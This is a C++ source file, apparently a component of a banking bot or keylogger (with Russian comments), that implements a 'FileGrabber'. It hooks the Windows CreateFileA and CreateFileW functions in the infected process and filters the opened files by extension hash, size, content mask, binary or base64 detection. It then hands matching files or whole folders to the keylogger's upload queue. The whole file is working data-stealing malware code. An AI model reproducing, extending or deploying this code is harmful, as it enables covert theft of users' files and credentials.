#include "UniversalKeyLogger.h"
#include "FileGrabber.h"
#include "Memory.h"
#include "String.h"
#include "GetApi.h"
#include "Utils.h"
#include "Splice.h"
#include "Unhook.h"

#include "BotDebug.h"

namespace FILEGRABBERDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define DBG FILEGRABBERDEBUGSTRINGS::DBGOutMessage<>

namespace FileGrabber {

TypeCreateFileW Real_CreateFileW;
TypeCreateFileA Real_CreateFileA;

PList receivers = 0; //получатели
DWORD PID = 0; //для предотвращения повторной инициализации
int stateGrabber = 0; //состояние граббера

static bool IsBin( BYTE* data, int szData )
{
	//считаем частоту символов
	int s[256];
	m_memset(s, 0, sizeof(s));

	for( int i = 0; i < szData; i++ ) s[data[i]]++;

	//средняя частота символа
	int avg = szData / 256;
	//начало и конец диапазона равномерно распределенных частот
	int min = avg - avg / 2 - 1; if( min <= 0 ) min = 1;
	int max = avg + avg / 2 + 1;
	//подсчитываем количество попаданий частот в диапазоне [m1;m2]
   	int m1 = 0, m2 = 0;
	for( int i = 0; i < 256; i++ )
		if( s[i] )
			if( min <= s[i] && s[i] <= max )
				m1++;
			else
				m2++;
	//если частоты равномерно распределены, то количество попаданий
	//должно быть примерно на 25% больше
	if( m1 * 75 / 100 > m2 )
		return true;
	return false;
}

//проверяет являются ли данные кодировкой base64
static bool IsBase64( BYTE* data, int szData )
{
	int sz = 0; //количество символов в data, исключаются переводі строк
	int max = 0; //максимальная длина последовательности символов кодировки base64
	int len = 0; //подсчет строчки символов
	int rows = 0; //количество строк
	for( int i = 0; i < szData; i++ )
	{
		char c = data[i];
		if( c != 13 && c != 10 ) 
		{
			if( (c >= 'A' && c <= 'Z') ||
				(c >= 'a' && c <= 'z') ||
				(c >= '0' && c <= '9') ||
				c == '+' || c == '/' || c == '=' ) len++;
			else
				if( len > max )
					max = len;
				else
					len = 0;
			sz++;
		}
		else
			rows++;

	}
	if( len * 100 / sz > 70 && rows > 0 ) //большинство текста это кодировка base64, а ткаже если разбиты на строки
		return true;
	return false;
}

static DWORD CalcExtHash( const char* fileName )
{
	char* p = STR::ScanEnd( (char*)fileName, '.' );
	if( p )
		return STR::GetHash( p + 1, 0, true );
	return 0;
}

static DWORD CalcExtHash( const wchar_t* fileName )
{
	wchar_t* p = WSTR::ScanEnd( (wchar_t*)fileName, '.' );
	if( p )
		return WSTR::GetHash( p + 1, 0, true );
	return 0;
}

//прповеряет является ли файл нужного нам расширения
static bool IsExt( DWORD hash, DWORD* exts )
{
	if( exts == 0 ) return false;
	while( *exts )
	{
		if( *exts == hash )
			return true;
		exts++;
	}
	return false;
}

static int FilterExt( const ParamEvent& e, Receiver* rv )
{
	int ret = 0;
	if( rv->ignoreExt || rv->neededExt )
	{
		DWORD hash =  e.unicode ? CalcExtHash(e.fileNameW) : CalcExtHash(e.fileNameA);
		if( rv->ignoreExt )
			if( IsExt( hash, rv->ignoreExt ) )
				ret = 1; //файл имеет расширение из-за которого он игнорируется
		if( rv->neededExt )
			if( IsExt( hash, rv->neededExt ) )
				ret = 2; //файл имеет расширение из-за которого файл передается пользовательскому обработчику
	}
	return ret;
}

//проверяет по нескольким первым байтам, содержимого файла, формат файла 
static bool IsFormatBeg( const ParamEvent& e, Receiver* rv )
{
	int n = 0;
	bool res = false;
	while( rv->ignoreBeg[n][0] && !res && n < MaxIgnoreBeg )
	{
		for( int i = 0; i <= MaxLenIgnoreBeg; i++ )
		{
			if( i == MaxLenIgnoreBeg || (rv->ignoreBeg[n][i] == 0 && i > 0) ) //строка совпала
			{
				res = true;
				break;
			}
			if( rv->ignoreBeg[n][i] != e.data[i] )
				break;
		}
		n++;
	}
	return res;
}

//загрузка файла, если не был загружен раньше
static bool LoadFile( ParamEvent& e )
{
	if( e.data ) return true; //файл был уже загружен
	e.data = (BYTE*)MemAlloc(e.szData + 1); //на 1 больше для конечного нуля, чтобы потом проводить поиск по маске
	if( e.data ) 
	{
		DWORD size = 0;
		pReadFile( e.file, e.data, e.szData, &size, NULL ); //читаем весь файл в память
		pSetFilePointer( e.file, 0, 0, FILE_BEGIN );
		if( size == e.szData ) //действительно все прочли
		{
			((char*)e.data)[e.szData] = 0; //файл представляем как строку
			return true;
		}
		else
		{
			MemFree(e.data);
			e.data = 0;
		}
	}
	return false;
}

//Проверяет каждого получателя и отсылаем им оповещения о срабатывании хука, согласно условиям получателя
void SendEvent( ParamEvent& e )
{
	if( !receivers )
		return;
	int count = List::Count(receivers);
	for( int i = 0; i < count; i++ )
	{
		Receiver* rv = (Receiver*)List::GetItem( receivers, i );
		if( !rv->ignore && e.access & rv->access ) //тип доступа
		{
			int send = 0; //слать событие (>0) или нет (=0)
			int extFilter = FilterExt( e, rv );
			if( extFilter > 0 ) //фильтер сработал
			{
				if( extFilter == 2 ) //файл нужного нам расширения
				{
					if( rv->aw & LOADFILE ) //нужно загрузить
						LoadFile(e);
					send = 1;
				}
			}
			else
			{
				DWORD h;
 				e.szData = (DWORD)pGetFileSize( e.file, &h );
				//подходит ли размер
				if( e.szData >= rv->minSize && (e.szData <= rv->maxSize || rv->maxSize < 0))
				{	
					if( rv->maska || rv->aw & FILEISBIN || rv->ignoreBeg[0][0] )
					{
						if( LoadFile(e) )
						{
							if( !IsFormatBeg( e, rv ) ) //файл не игнорируемого формата
							{
								//если есть какой-то из фильтров, то сообщаем только тогда когда есть реакция на один из них
								bool filters = false; //проходил ли через какой-то фильтер
								for(;;)
								{
									//проверяем маску
									if( rv->maska )
									{
										filters = true;
										if( WildCmp( (char*)e.data, rv->maska ) )
										{
											send = 2; break;
										}
									}
	
									if( rv->aw & FILEISBIN )
									{
										filters = true;
										if( IsBin( (BYTE*)e.data, e.szData ) )
										{
											send = 3; break;
										}
									}
		
									if( rv->aw & FILEISBASE64 )
									{
										filters = true;
										if( IsBase64( (BYTE*)e.data, e.szData ) )
										{
											send = 4; break;
										}
									}
									if( filters ) send = 0; //если ни один из фильтров не сработал, то сообщение не шлем
									break;
								}
							}	
						}
					}
					else
					{
						if( rv->aw & LOADFILE ) //нужно загрузить
							LoadFile(e);
						send = 5; //нужно оповещать о файлах определенного размера
					}
				}
			}
			if( rv->FuncReceiver && send > 0 )
			{
				e.nameSend[0] = 0;
				if( e.unicode )
				{
					DBG("FileGrabberW", "Отреагировали на файл '%ls'(%d), size: %d", e.fileNameW, send, e.szData );
					e.fileName = WSTR::ToAnsi( e.fileNameW, 0 );
				}
				else
				{
					DBG("FileGrabberA", "Отреагировали на файл '%s'(%d), size: %d", e.fileNameA, send, e.szData );
					e.fileName = (char*)e.fileNameA;
				}

				e.shortName = File::ExtractFileNameA( e.fileName, false );
				//ищем расширение
				e.extFile = 0;
				const char* p = STR::ScanEnd( (char*)e.shortName, '.' ); 
				if( p ) e.extFile = p + 1; 

				int res = rv->FuncReceiver(&e);

				if( res & SENDFILE ) //если возвращает SENDFILE, то отправляем содержимое
				{
					if( e.data )
					{
						const char* nameSend = "FileGrabber";
						if( res & CURRNAMEFILE ) //извлекаем имя из полного имени файла
							nameSend = e.shortName;
						else
							if( res & CURRFULLNAMEFILE ) //имя файла с полными путями
								nameSend = e.fileName;
							else
								if( e.nameSend[0] ) //имя передал получатель
									nameSend = e.nameSend;
						DBG( "FileGrabber", "Отправили файл '%s' под именем '%s'", e.fileName, nameSend );
						KeyLogger::AddFile( 0, (char*)nameSend, e.data, e.szData );
					}
				}
				else 
					if( res & SENDFOLDER )
					{
						pPathRemoveFileSpecA(e.fileName);
						//добавляем в конце слеш, так функция PathRemoveFileSpec его убирает
						int sz = m_lstrlen(e.fileName);
						if( e.fileName[sz - 1] != '\\' )
						{
							e.fileName[sz] = '\\';
							e.fileName[sz + 1] = 0;
							sz++;
						}
						DBG( "FileGrabber", "Отправляем папку '%s' под именем '%s'", e.fileName, e.nameSend );
						int currState = stateGrabber;
						stateGrabber |= IGNOREHOOK; //отключаем граббер
						KeyLogger::AddDirectory( e.fileName, e.nameSend );
						stateGrabber = currState; //восстанавливаем состояние
					}
				if( res & STOPRECEIVER )
					rv->ignore = true;
				if( e.fileName != e.fileNameA ) //освобождаем память, если была перекодировка
					STR::Free(e.fileName);
			}
		}
	}
	MemFree(e.data);
	e.data = 0;
}

HANDLE WINAPI Hook_CreateFileA( LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
{
	HANDLE File = Real_CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
	if( (stateGrabber & IGNOREHOOK) == 0 && (dwFlagsAndAttributes & FILE_FLAG_OVERLAPPED) == 0 && lpFileName && lpFileName[0] != '/' && lpFileName[0] != '\\' ) //игнорируем открытие разных портов
	{
	//DBG("FileGrabberA", "%s", lpFileName);
		//инициализация параметров события
		ParamEvent e;
		e.data = 0;
		e.szData = 0;
		m_lstrcpy( e.fileNameA, lpFileName );
		e.unicode = false;
		e.access = dwDesiredAccess;
		e.file = File;
		SendEvent(e); //посылаем событие
	}
	return File;
}

HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
{
	HANDLE File = Real_CreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );

	if( (stateGrabber & (IGNOREHOOK | INHOOK)) == 0 && (dwFlagsAndAttributes & FILE_FLAG_OVERLAPPED) == 0 && lpFileName && lpFileName[0] != '/' && lpFileName[0] != '\\' ) //игнорируем открытие разных портов
	{
		//stateGrabber |= INHOOK;
		//инициализация параметров события
		ParamEvent e;
		e.data = 0;
		e.szData = 0;
		int len = m_wcslen(lpFileName);
		m_memcpy( e.fileNameW, lpFileName, sizeof(WCHAR) * (len + 1) );
		e.unicode = true;
		e.access = dwDesiredAccess;
		e.file = File;

	   	SendEvent(e); //посылаем событие
		//stateGrabber &= ~INHOOK;
	}
	return File;
}

//удаление получателя при уничтожении списка
void DelReceiver(void* p)
{
	Receiver* pp = (Receiver*)p;
	MemFree(pp->ignoreExt);
	MemFree(pp->neededExt);
	MemFree(p);
}

bool Init( int flags )
{
	if( !IsNewProcess(PID) ) //в том же процессе, инициализация уже была
		return true; //инициализация уже была, поэтому говорим, что инициализация успешная
	receivers = List::Create();
	if( !receivers )
		return false;
	List::SetFreeItemMehod( receivers, DelReceiver ); //для автоматического удаления получателей
	if( flags & CREATEFILEA )
	{
		if (!HookApi(DLL_KERNEL32, Hash_CreateFileA, &Hook_CreateFileA, &Real_CreateFileA ) )
			return false;
	}
	if( flags & CREATEFILEW )
	{
		if (!HookApi(DLL_KERNEL32, Hash_CreateFileW, &Hook_CreateFileW, &Real_CreateFileW ) )
			return false;
	}
	stateGrabber = 0;
	return true;
}

void Release()
{
	UnhookCreateFile();
	List::Free(receivers);
	receivers = 0;
	PID = 0;
	stateGrabber = 0;
}

Receiver* CreateReceiver()
{
	Receiver* ret = (Receiver*)MemAlloc( sizeof(Receiver) );
	ret->access = GENERIC_READ;
	ret->aw = CREATEFILEA | CREATEFILEW;
	return ret;
}

bool AddReceiver( Receiver* rv )
{
	if( receivers )
	{
		List::Add( receivers, rv );
		return true;
	}
	return false;
}

 //добавляет игнорируемые форматы файлов, которые указываются в начале файла
bool AddIgnoreBeg( Receiver* rv, const char* beg )
{
	for( int i = 0; i < MaxIgnoreBeg; i++ )
		if( rv->ignoreBeg[i][0] == 0 )
		{
			int j;
			for( j = 0; j < MaxLenIgnoreBeg && beg[j]; j++ )
				rv->ignoreBeg[i][j] = beg[j];
			//остаток забиваем нулями
			rv->ignoreBeg[i][j++] = 0; //такой костыль, чтобы компилятор не просталял _memset, которая не линкуется
			for( ; j < MaxLenIgnoreBeg; j++ )
				rv->ignoreBeg[i][j] = rv->ignoreBeg[i][j - 1];
			return true;
		}
	return false;
}

static DWORD* CopyArrayExt( const DWORD* m )
{
	//считаем колоичество элементов
	const DWORD* pm = m;
	while( *pm++ );
	int sz = (pm - m) * sizeof(DWORD);
	DWORD* ret = (DWORD*)MemAlloc(sz);
	if( ret )
		m_memcpy( ret, m, sz );
	return ret;
}

//добавляет массив хешей игнорируемых расширений файлов, должен заканчиваться нулем
bool AddIgnoreExt( Receiver* rv, const DWORD* m )
{
	rv->ignoreExt = CopyArrayExt(m);
	if( rv->ignoreExt )
		return true;
	return false;
}

//добавляет массив хешей нужных нам расширений файлов, должен заканчиваться нулем
bool AddNeededExt( Receiver* rv, const DWORD* m )
{
	rv->neededExt = CopyArrayExt(m);
	if( rv->neededExt )
		return true;
	return false;
}

};

